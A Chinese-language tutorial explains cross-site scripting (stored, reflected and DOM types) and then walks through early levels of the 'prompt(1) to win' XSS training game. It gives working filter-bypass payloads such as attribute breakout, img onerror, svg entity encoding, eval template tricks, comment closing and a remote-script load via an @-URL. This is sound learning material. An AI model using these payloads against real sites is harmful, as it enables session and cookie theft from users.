# 什么是XSS

Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。

XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。

在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：

- 来自用户的 UGC 信息
- 来自第三方的链接
- URL 参数
- POST 参数
- Referer （可能来自不可信的来源）
- Cookie （可能来自其他子域注入）

# XSS分类
## 存储型
存储型 XSS 的攻击步骤：
* 攻击者将恶意代码提交到目标网站的数据库中。
* 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
* 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
* 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等

## 反射型
反射型 XSS 的攻击步骤：
* 攻击者构造出特殊的 URL，其中包含恶意代码。
* 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
* 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
* 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
* 反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。

由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。

## DOM型
DOM 型 XSS 的攻击步骤：
* 攻击者构造出特殊的 URL，其中包含恶意代码。
* 用户打开带有恶意代码的 URL。
* 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
* 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

# XSS攻击游戏
[prompt(1) to win](http://prompt.ml/0)
[prompt(1) to win平台通关记录](https://xz.aliyun.com/t/4507#:~:text=prompt%EF%BC%881%EF%BC%89to,win%E6%98%AF%E4%B8%80%E4%B8%AA%E6%AF%94%E8%BE%83%E7%BB%8F%E5%85%B8%E7%9A%84xss%E8%AE%AD%E7%BB%83%E5%B9%B3%E5%8F%B0%EF%BC%8C%E4%B8%BB%E8%A6%81%E7%9A%84%E7%9B%AE%E7%9A%84%E6%98%AF%E7%BB%95%E8%BF%87%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6%E7%84%B6%E5%90%8E%E6%89%A7%E8%A1%8Cprompt%EF%BC%881%EF%BC%89%E4%BE%BF%E6%88%90%E5%8A%9F%E8%BF%87%E5%85%B3%EF%BC%8C%E4%B8%8D%E6%B6%89%E5%8F%8Axss%E4%B9%8B%E5%90%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E3%80%82)
[通关记录2](https://blog.csdn.net/qq_35078631/article/details/77073233)
通过实现xss攻击通关，帮助实践深入理解xss攻击
将攻击中的alert换成prompt就是答案
> 0
```html
<input type="text" value="">
<!--对于网页上的输入框，如果输入以下内容，会被浏览器解析为js脚本并执行，这就是xss攻击了 -->
攻击：
"><script>alert(1)</script><"
```
> 1
```html
防护：
'<article>' + input + '</article>'
<!--
var stripTagsRE = /<\/?[^>]+>/gi;
input = input.replace(stripTagsRE, '');
针对显示进行了过滤，将<***>或者<***/>过滤，0中的攻击无效了 -->
攻击：
<img src=# onerror="alert(1)" 
<!-- src引用的图片不存在则执行onerror事件-->
或
<body onload=alert(1)// 
<!-- onload事件会在页面或图像加载完成后立即发生 -->
```
> 2
```html
防护：
<!--
input = input.replace(/[=(]/g, '');
过滤了=以及( 
-->

攻击：
<svg><script>alert&#x28;1)</script>
<!-- 由于输入遇到js代码会先执行js代码，此时的html编码未被解析，绕过正则后，由于前面的svg标签，会对html编码进行解析，&#x28;的html编码便是(，因此可以成功执行 -->
或：
<script>eval.call`${'prompt\x281)'}`</script>
```
> 3
```html
防护：
'<!-- ' + input + ' -->'; 
<!-- 
input = input.replace(/->/g, '_');
试图将内容变成注释防止执行，并将内容里的->替换为_防止注释标签闭合 -->
攻击：
--!> <script>alert(1)    </script>
--!>也可以使注释提前闭合
```
> 4 同源的正则过滤

@的特性进行远程访问服务器的js文件，构造的payload可以当做是以http://prompt.ml 作为身份验证去访问请求localhost/xss.js，由于src引用了这个文件，所以在js文件上写入prompt(1)，理论可以弹出1，但是由于本题的正则匹配，所以必须打入 http://prompt.ml/@localhost/xss.js 才能满足正则匹配，而浏览器并不允许这样的格式，但是代码中有decodeURIComponent函数，可以将/改为%2f，完成绕过。